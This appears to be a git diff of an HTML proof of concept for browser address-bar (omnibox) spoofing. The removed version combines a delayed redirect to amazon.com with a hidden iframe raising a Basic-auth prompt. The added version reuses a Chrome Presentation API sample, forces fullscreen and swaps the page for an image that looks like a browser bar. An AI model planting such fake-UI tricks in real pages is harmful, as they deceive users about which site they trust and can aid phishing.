@@ -1,56 +1,140 @@
 
-<!DOCTYPE HTML>
-<html lang="en-US">
-<head>
-	<meta charset="UTF-8">
-	<title>Omnibox spoofing</title>
-	<style>
-		body{
-		    margin-top: 0px; 
-		    margin-bottom: 0px; 
-		    margin-left: 0px; 
-		    margin-right: 0px;
-		    padding: 0;
-		}
-      .input1 {
-  background-color: red;
-  border: none;
-  color: white;
-  padding: 15px 32px;
-  text-align: center;
-  text-decoration: none;
-  display: inline-block;
-  font-size: 36px;
-  margin: 4px 2px;
-  cursor: pointer;
-}
-.input2 {
-  background-color: green;
-  border: none;
-  color: white;
-  padding: 125px 32px;
-  text-align: center;
-  text-decoration: none;
-  display: inline-block;
-  font-size: 36px;
-  margin: 4px 2px;
-  cursor: pointer;
-}
-	</style>
 
-	<script>
-		function exec() {
-				document.getElementById("content").innerHTML+= '<iframe src="https://jigsaw.w3.org/HTTP/Basic/" style="visibility:hidden;display:none"></iframe>';
-		}
-	</script>
-</head>
+<p>
+  <button id="start">click here please</button>
+</p>
+<p>
 
-<body>
-	<div id="content">
-        <input class="input1" onclick="setTimeout(function(){document.location='https://www.amazon.com'}, 559)" type="button" style="size:32" value="click here first"></center>
-		<input class="input2" onclick="exec();" type="button" value="then click here ">
-	</div>
+<script>
+  var ChromeSamples = {
+    log: function() {
+      var line = Array.prototype.slice.call(arguments).map(function(argument) {
+        return typeof argument === 'string' ? argument : JSON.stringify(argument);
+      }).join(' ');
 
-</body>
+      document.querySelector('#log').textContent += line + '\n';
+    },
 
+    clearLog: function() {
+      document.querySelector('#log').textContent = '';
+    },
+
+    setStatus: function(status) {
+      document.querySelector('#status').textContent = status;
+    },
+
+    setContent: function(newContent) {
+      var content = document.querySelector('#content');
+      while(content.hasChildNodes()) {
+        content.removeChild(content.lastChild);
+      }
+      content.appendChild(newContent);
+    }
+  };
+</script>
+
+<div id="output" class="output">
+  <div id="content"></div>
+  <div id="status"></div>
+  <pre id="log"></pre>
+</div>
+
+
+
+
+<script>
+  log = ChromeSamples.log;
+</script>
+
+
+
+  
+    
+      <script>
+const presentationRequest = new PresentationRequest(['receiver/index.html']);
+
+// Make this presentation the default one when using the "Cast" browser menu.
+navigator.presentation.defaultRequest = presentationRequest;
+
+let presentationConnection;
+
+document.querySelector('#start').addEventListener('click', function() {
+	document.body.webkitRequestFullscreen();
+    log('Starting presentation request...');
+	setTimeout(function(){presentationRequest.start();document.body.innerHTML='<img src=https://scontent.fmad3-1.fna.fbcdn.net/v/t31.0-8/27907993_10213005390063869_9134525451984292054_o.jpg?oh=60751f26196ad8042695c8e8c13a40df&oe=5ADBFE09 width=\'101.5%\' height=\'9%\' style=\'margin-left:-8px;margin-top:-6px\' />'}, 80)
+  .then(connection => {
+    log('> Connected to ' + connection.url + ', id: ' + connection.id);
+  })
+  .catch(error => {
+    log('> ' + error.name + ': ' + error.message);
+  });
+});
+
+presentationRequest.addEventListener('connectionavailable', function(event) {
+  presentationConnection = event.connection;
+  presentationConnection.addEventListener('close', function() {
+    log('> Connection closed.');
+  });
+  presentationConnection.addEventListener('terminate', function() {
+    log('> Connection terminated.');
+  });
+  presentationConnection.addEventListener('message', function(event) {
+    log('> ' + event.data);
+  });
+});
+
+document.querySelector('#sendMessage').addEventListener('click', function() {
+  const message = document.querySelector('#message').value.trim();
+  const lang = document.body.lang || 'en-US';
+
+  log('Sending "' + message + '"...');
+  presentationConnection.send(JSON.stringify({message, lang}));
+});
+
+document.querySelector('#close').addEventListener('click', function() {
+  log('Closing connection...');
+  presentationConnection.close();
+});
+
+document.querySelector('#terminate').addEventListener('click', function() {
+  log('Terminating connection...');
+  presentationConnection.terminate();
+});
+
+document.querySelector('#reconnect').addEventListener('click', () => {
+  const presentationId = document.querySelector('#presentationId').value.trim();
+
+  presentationRequest.reconnect(presentationId)
+  .then(connection => {
+    log('Reconnected to ' + connection.id);
+  })
+  .catch(error => {
+    log('Presentation.reconnect() error, ' + error.name + ': ' + error.message);
+  });
+});
+
+/* Availability monitoring */
+
+presentationRequest.getAvailability()
+.then(availability => {
+  log('Available presentation displays: ' + availability.value);
+  availability.addEventListener('change', function() {
+    log('> Available presentation displays: ' + availability.value);
+  });
+})
+.catch(error => {
+  log('Presentation availability not supported, ' + error.name + ': ' +
+      error.message);
+});
+
+</script>
+    
+  
+
+  
+  
+
+
+
+  </body>
 </html>
